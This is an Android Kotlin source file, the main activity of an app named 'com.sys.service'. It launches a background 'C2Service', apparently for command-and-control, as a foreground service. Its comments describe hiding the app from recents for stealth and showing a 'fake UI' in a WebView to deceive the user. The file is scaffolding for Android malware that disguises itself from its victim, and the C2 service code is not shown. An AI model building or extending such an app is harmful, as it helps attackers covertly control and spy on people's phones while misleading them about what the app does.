package com.sys.service

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Start the background C2Service
        val serviceIntent = Intent(this, C2Service::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // 2. Hide the app from recents (optional, but helps stealth)
        // Note: You might need a custom theme for full hiding

        // 3. Load the WebView to show the fake UI
        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.webViewClient = WebViewClient()
        
        // This loads index.html from the assets folder
        webView.loadUrl("file:///android_asset/index.html") 
        
        setContentView(webView)
    }
}
